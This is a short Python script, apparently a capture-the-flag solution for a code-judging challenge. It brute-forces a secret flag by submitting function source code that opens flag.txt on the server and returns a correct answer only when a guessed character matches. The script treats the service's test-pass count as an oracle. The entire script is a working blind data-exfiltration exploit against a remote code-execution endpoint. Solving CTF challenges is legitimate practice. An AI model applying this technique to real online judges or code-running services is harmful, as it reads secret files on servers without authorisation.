import requests

flag = ''
letters = "1234567890rtopasedfghjklzxcvbnm}{_!"

for i in range(33):
    for char in letters:
        data = f"def f(a ,b):\n\tfile_handler = open('flag.txt', 'r')\n\tstring_in_file = file_handler.read().replace('\\n', '')\n\tstring_in_file = string_in_file[{i}:]\n\tif '{char}' == string_in_file[:1]:\n\t\treturn a + b\n\telse:\n\t\treturn 0"
        r = requests.post('https://yeetcode.be.ax/yeetyeet', data=data)
        r_json = r.json()
        p_check = r_json['p']
        if p_check == 10:
            flag += char
            print(flag)
            break
print(flag)
